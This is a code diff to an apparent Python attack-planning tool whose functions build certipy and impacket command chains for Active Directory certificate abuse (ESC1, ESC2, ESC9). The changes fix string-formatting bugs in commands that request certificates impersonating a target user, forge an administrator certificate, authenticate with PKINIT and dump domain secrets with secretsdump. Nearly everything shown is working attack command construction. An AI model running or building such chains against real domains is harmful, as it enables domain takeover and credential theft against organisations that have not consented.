@@ -129,7 +129,7 @@ def esc1(ca: str, template: str, target_upn: str, domain: str, dc: str,
         "# Authenticate with the cert (PKINIT) → TGT for the impersonated user:",
         f"certipy auth -pfx {target_upn.split('@')[0]}.pfx -dc-ip {dc}",
         "# Then dump secrets:",
-        f"impacket-secretsdump -k -no-pass {target_upn}@{dc}",
+        f"impacket-secretsdump -k -no-pass {target_upn.split('@')[0]}@{dc}",
     ]
 
 
@@ -143,7 +143,7 @@ def esc2_subca(ca: str, template: str, domain: str, dc: str, username: str,
         f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
         f"-ca '{ca}' -template '{template}'",
         "# Use the cert to forge an arbitrary user cert (certipy forge):",
-        "certipy forge -ca-pfx <issued>.pfx -upn administrator@{domain} "
+        f"certipy forge -ca-pfx <issued>.pfx -upn administrator@{domain} "
         f"-subject 'CN=Administrator,CN=Users,DC={domain.replace('.', ',DC=')}'",
     ]
 
@@ -264,7 +264,7 @@ def esc9_no_security_extension(ca: str, template: str, target_upn: str,
         f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
         f"-ca '{ca}' -template '{template}' -upn '{target_upn}'",
         f"certipy auth -pfx {target_upn.split('@')[0]}.pfx -dc-ip {dc} "
-        "-domain {domain}",
+        f"-domain {domain}",
     ]
 
 
